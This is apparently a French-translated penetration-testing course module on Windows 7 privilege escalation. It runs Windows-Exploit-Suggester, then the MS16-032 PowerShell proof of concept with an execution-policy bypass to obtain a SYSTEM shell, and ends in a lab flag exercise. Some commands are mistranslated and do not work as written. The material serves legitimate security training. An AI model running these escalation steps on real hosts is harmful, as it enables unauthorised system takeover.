Versions de bureau Windows
========================

* * * * *

Windows 7 est arrivé en fin de vie le 14 janvier 2020, mais il est toujours utilisé dans de nombreux environnements.

* * * * *

Windows 7 par rapport aux versions plus récentes
-------------------------------------

Au fil des ans, Microsoft a ajouté des fonctionnalités de sécurité améliorées aux versions ultérieures de Windows Desktop. Le tableau ci-dessous montre quelques différences notables entre Windows 7 et Windows 10.

| Caractéristique | Windows 7 | Windows 10 |
| --- | --- | --- |
| [Mot de passe Microsoft (MFA)](https://blogs.windows.com/windowsdeveloper/2016/01/26/convenient-two-factor-authentication-with-microsoft-passport-and-windows-hello/) | | X |
| [BitLocker](https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview) | Partielle | X |
| [Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard) | | X |
| [Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard) | | X |
| [Device Guard (intégrité du code)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419) | | X |
| [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview) | Partielle | X |
| [Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security) | Partielle | X |
| [Control Flow Guard] (https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard) | | X |

* * * * *

Étude de cas Windows 7
--------------------

À ce jour, les estimations indiquent qu'il pourrait y avoir encore plus de 100 millions d'utilisateurs sur Windows 7. Selon [NetMarketShare](https://www.netmarketshare.com/operating-system-market-share.aspx), en novembre 2020 , Windows 7 était le deuxième système d'exploitation de bureau le plus utilisé après Windows 10. Windows 7 est standard dans les grandes entreprises des secteurs de l'éducation, de la vente au détail, des transports, de la santé, de la finance, du gouvernement et de la fabrication.

Comme indiqué dans la dernière section, en tant que testeurs d'intrusion, nous devons comprendre le cœur de métier, l'appétit pour le risque et les limites de nos clients qui peuvent les empêcher de supprimer complètement toutes les versions des systèmes EOL tels que Windows 7. Ce n'est pas assez bon pour nous pour leur donner simplement une conclusion pour un système EOL avec la recommandation de mise à niveau/mise hors service sans aucun contexte. Nous devrions avoir des discussions continues avec nos clients lors de nos évaluations pour acquérir une compréhension de leur environnement. Même si nous pouvons attaquer/élever les privilèges sur un hôte Windows 7, il peut y avoir des mesures qu'un client peut prendre pour limiter l'exposition jusqu'à ce qu'il puisse quitter le(s) système(s) EOL.

Un grand client de vente au détail peut avoir des appareils Windows 7 intégrés dans des centaines de ses magasins exécutant ses systèmes de point de vente (POS). Il n'est peut-être pas financièrement possible pour eux de les mettre à niveau tous en même temps, nous devrons donc peut-être travailler avec eux pour développer des solutions pour atténuer le risque. Un grand cabinet d'avocats avec un ancien système Windows 7 peut être en mesure de le mettre à niveau immédiatement ou même de le supprimer du réseau. Le contexte est important.

Regardons un hôte Windows 7 que nous pourrions découvrir dans l'un des secteurs mentionnés ci-dessus. Pour notre cible Windows 7, nous pouvons à nouveau utiliser `Sherlock` comme dans l'exemple Server 2008, mais examinons [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

#### Installer les dépendances Python (VM locale uniquement)

Cet outil fonctionne sur la Pwnbox, mais pour le faire fonctionner sur une version locale de Parrot, nous devons procéder comme suit pour installer les dépendances nécessaires.

Installer les dépendances Python (VM locale uniquement)

```
dsgsec@htb[/htb]$ sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
dsgsec@htb[/htb]$ sudo tar -xf setuptools-2.0.tar.gz
dsgsec@htb[/htb]$ cd setuptools-2.0/
dsgsec@htb[/htb]$ sudo python2.7 setup.py install

dsgsec@htb[/htb]$ sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
dsgsec@htb[/htb]$ sudo tar -xf xlrd-1.0.0.tar.gz
dsgsec@htb[/htb]$ cd xlrd-1.0.0/
dsgsec@htb[/htb]$ sudo python2.7 setup.py install

```

#### Collecte de la sortie de la commande Systeminfo

Une fois cela fait, nous devons capturer la sortie de la commande `systeminfo` et l'enregistrer dans un fichier texte sur notre machine virtuelle d'attaque.

Collecte de la sortie de la commande Systeminfo

```
C:\htb> informations système

Nom d'hôte : WINLPE-WIN7
Nom du système d'exploitation : Microsoft Windows 7 Professionnel
Version du système d'exploitation : 6.1.7601 Service Pack 1 version 7601
Fabricant du système d'exploitation : Microsoft Corporation
Configuration du système d'exploitation : poste de travail autonome
Type de construction du système d'exploitation : multiprocesseur gratuit
Propriétaire enregistré : mrb3n
Organisation enregistrée :
Identifiant du produit : 00371-222-9819843-86644
Date d'installation d'origine : 25/03/2021, 19:23:47
Heure de démarrage du système :13/05/2021, 17:14:12
Fabricant du système : VMware, Inc.
Modèle de système : plate-forme virtuelle VMware
Type de système : PC basé sur x64
Processeur(s) : 2 processeur(s) installé(s).
                            [01] : AMD64 Famille 23 Modèle 49 Stepping 0 AuthenticAMD ~2994 Mhz
                            [02] : AMD64 Famille 23 Modèle 49 Stepping 0 AuthenticAMD ~2994 Mhz
Version du BIOS : Phoenix Technologies LTD 6.00, 12/12/2018
Répertoire Windows : C:\Windows

<SNIP>

```

#### Mise à jour de la base de données locale des vulnérabilités Microsoft

Nous devons ensuite mettre à jour notre copie locale de la base de données Microsoft Vulnerability. Cette commande enregistrera le contenu dans un fichier Excel local.

Mise à jour de la base de données locale des vulnérabilités Microsoft

```
dsgsec@htb[/htb]$ sudo python2.7 windows-exploit-suggester.py --update

```

#### Exécution de Windows Exploit Suggester

Une fois cela fait, nous pouvons exécuter l'outil sur la base de données de vulnérabilités pour vérifier les failles potentielles d'escalade de privilèges.

Exécution de l'outil de suggestion d'exploits Windows

```
dsgsec@htb[/htb]$ python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt

[*] lancement de winsploit version 3.3...
[*] fichier de base de données détecté comme xls ou xlsx en fonction de l'extension
[*] Tentative de lecture à partir du fichier d'entrée systeminfo
[+] fichier d'entrée systeminfo lu avec succès (utf-8)
[*] interrogation du fichier de base de données pour les vulnérabilités potentielles
[*] comparant les 3 correctifs aux 386 bulletins potentiels avec une base de données de 137 exploits connus
[*] il y a maintenant 386 vulnérabilités restantes
[+] [E] exploitdb PoC, [M] module Metasploit, [*] bulletin manquant
[+] version de Windows identifiée comme 'Windows 7 SP1 64-bit'
[*]
[E] MS16-135 : Mise à jour de sécurité pour les pilotes en mode noyau Windows (3199135) - Important
[*] https://www.exploit-db.com/exploits/40745/ -- Noyau Microsoft Windows - déni de service win32k (MS16-135)
[*] https://www.exploit-db.com/exploits/41015/ -- Noyau Microsoft Windows - Escalade des privilèges 'win32k.sys' 'NtSetWindowLongPtr' (MS16-135) (2)
[*] https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*]
[E] MS16-098 : Mise à jour de sécurité pour les pilotes en mode noyau Windows (3178466) - Important
[*] https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*]
[M] MS16-075 : Mise à jour de sécurité pour Windows SMB Server (3164038) - Important
[*] https://github.com/foxglovesec/RottenPotato
[*] https://github.com/Kevin-Robertson/Tater
[*] https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows : Élévation de privilège de réflexion locale WebDAV NTLM
[*] https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Escalade des privilèges Windows
[*]
[E] MS16-074 : Mise à jour de sécurité pour le composant Microsoft Graphics (3164036) - Important
[*] https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Plusieurs gestionnaires d'enregistrements EMF liés à DIB Lectures hors limites basées sur le tas/Divulgation de mémoire (MS16-074) , PoC
[*] https://www.exploit-db.com/exploits/39991/ -- Noyau Windows - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*]
[E] MS16-063 : Mise à jour de sécurité cumulative pour Internet Explorer (3163649) - Critique
[*] https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*]
[E] MS16-059 : Mise à jour de sécurité pour Windows Media Center (3150220) - Important
[*] https://www.exploit-db.com/exploits/39805/ -- Microsoft Windows Media Center - Traitement de fichiers .MCL Exécution de code à distance (MS16-059), PoC
[*]
[E] MS16-056 : Mise à jour de sécurité pour Windows Journal (3156761) - Critique
[*] https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 JavaScriptStackWalker Corruption de la mémoire (MS15-056)
[*] http://blog.skylined.nl/20161206001.html - MSIE jscript9 JavaScriptStackWalker corruption de la mémoire
[*]
[E] MS16-032 : Mise à jour de sécurité pour l'ouverture de session secondaire afin d'adresser l'élévation de privilège (3143141) - Important
[*] https://www.exploit-db.com/exploits/40107/ -- MS16-032 Élévation des privilèges du handle de connexion secondaire, MSF
[*] https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - La norme de connexion secondaire traite l'escalade de privilèges de désinfection manquante (MS16-032), PoC
[*] https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Élévation des privilèges locaux (MS16-032) (PowerShell), PoC
[*] https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Élévation des privilèges locaux (MS16-032) (C#)
[*]

<SNIP>

[*]
[M] MS14-012 : Mise à jour de sécurité cumulative pour Internet Explorer (2925418) - Critique
[M] MS14-009 : Des vulnérabilités dans .NET Framework pourraient permettre une élévation de privilèges (2916607) - Important
[E] MS13-101 : Des vulnérabilités dans les pilotes en mode noyau de Windows pourraient permettre une élévation de privilèges (2880430) - Important
[M] MS13-097 : Mise à jour de sécurité cumulative pour Internet Explorer (2898785) - Critique
[M] MS13-090 : Mise à jour de sécurité cumulative des bits d'arrêt ActiveX (2900986) - Critique
[M] MS13-080 : Mise à jour de sécurité cumulative pour Internet Explorer (2879017) - Critique
[M] MS13-069 : Mise à jour de sécurité cumulative pour Internet Explorer (2870699) - Critique
[M] MS13-059 : Mise à jour de sécurité cumulative pour Internet Explorer (2862772) - Critique
[M] MS13-055 : Mise à jour de sécurité cumulative pour Internet Explorer (2846071) - Critique
[M] MS13-053 : Des vulnérabilités dans les pilotes en mode noyau de Windows pourraient permettre l'exécution de code à distance (2850851) - Critique
[M] MS13-009 : Mise à jour de sécurité cumulative pour Internet Explorer (2792100) - Critique
[M] MS13-005 : Une vulnérabilité dans le pilote en mode noyau de Windows pourrait permettre une élévation de privilèges (2778930) - Important
[E] MS12-037 : Mise à jour de sécurité cumulative pour Internet Explorer (2699988) - Critique
[*] http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - ID d'étendue de col fixe Full ASLR, DEP & EMET 5., PoC
[*] http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - ID de portée de col fixe Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*]
[*] fait

```

Supposons que nous ayons obtenu un shell Meterpreter sur notre cible en utilisant le framework Metasploit. Dans ce cas, nous pouvons également utiliser ce [module de suggestion d'exploit local](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get- more/) ce qui nous aidera à trouver rapidement tous les vecteurs potentiels d'escalade de privilèges et à les exécuter dans Metasploit si un module existe.

En parcourant les résultats, nous pouvons voir une liste assez longue, quelques modules Metasploit et quelques exploits PoC autonomes. Nous devons filtrer le bruit, supprimer tous les exploits de déni de service et les exploits qui n'ont pas de sens pour notre système d'exploitation cible. Celui qui ressort immédiatement comme intéressant est le MS16-032. Une explication détaillée de ce bogue peut être trouvée dans cet [article de blog Project Zero](https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html) qui est un bogue dans la connexion secondaire. Service.

#### Exploitation de MS16-032 avec PowerShell PoC

Utilisons un [PowerShell PoC](https://www.exploit-db.com/exploits/39719) pour tenter d'exploiter cela et d'élever nos privilèges.

Exploitation de MS16-032 avec PowerShell PoC

```
PS C:\htb> Contournement Set-ExecutionPolicy -processus de portée

Modification de la politique d'exécution
La politique d'exécution vous protège des scripts auxquels vous ne faites pas confiance. La modification de la stratégie d'exécution peut exposer
vous aux risques de sécurité décrits dans la rubrique d'aide about_Execution_Policies. Voulez-vous modifier l'exécution
politique?
[O] Oui [N] Non [S] Suspendre [?] Aide (la valeur par défaut est "O") : A
[O] Oui [N] Non [S] Suspendre [?] Aide (la valeur par défaut est "O") : O

PS C:\htb> Import-Module .\Invoke-MS16-032.ps1
PS C:\htb> Invoke-MS16-032

          __ __ ___ ___ ___ ___ ___ ___
         | V | _|_ | | _|___| |_ |_ |
         | |_ |_| |_| . |___| | |_ | _|
         |_|_|_|___|_____|___| |___|___|___|

                        [par b33f -> @FuzzySec]

[?] Nombre de cœurs du système d'exploitation : 6
[>] Duplication du handle CreateProcessWithLogonW
[?] Terminé, en utilisant le handle de thread : 1656

[*] Détection d'un jeton d'emprunt d'identité privilégié..

[?] Le sujet appartient à : svchost
[+] Discussion suspendue
[>] Effacement du jeton d'emprunt d'identité actuel
[>] Construction du jeton d'emprunt d'identité SYSTEM
[?] Réussite, ouvrez le descripteur de jeton SYSTEM : 1652
[+] Reprise du fil..

[*] Renifler le shell SYSTEM..

[>] Duplication du jeton SYSTEM
[>] Lancement de la course aux jetons
[>] Lancement de la course au processus
[!] Sainte fuite de poignée Batman, nous avons une coque SYSTEM !!

```

#### Création d'une console SYSTEM

Cela fonctionne et nous générons une console SYSTEM cmd.

Créer une console SYSTEM

```
C:\htb> whoami

autorité nt\système

```

* * * * *

Attaquer Windows 7
-------------------

En prenant les exemples d'énumération que nous avons parcourus dans ce module, accédez au système ci-dessous, trouvez un moyen de passer au niveau d'accès `NT AUTHORITY\SYSTEM` (il peut y avoir plus d'un moyen) et soumettez le fichier `flag.txt`  sur le bureau de l'administrateur. Après avoir reproduit les étapes ci-dessus, mettez-vous au défi d'utiliser une autre méthode pour élever les privilèges sur l'hôte cible.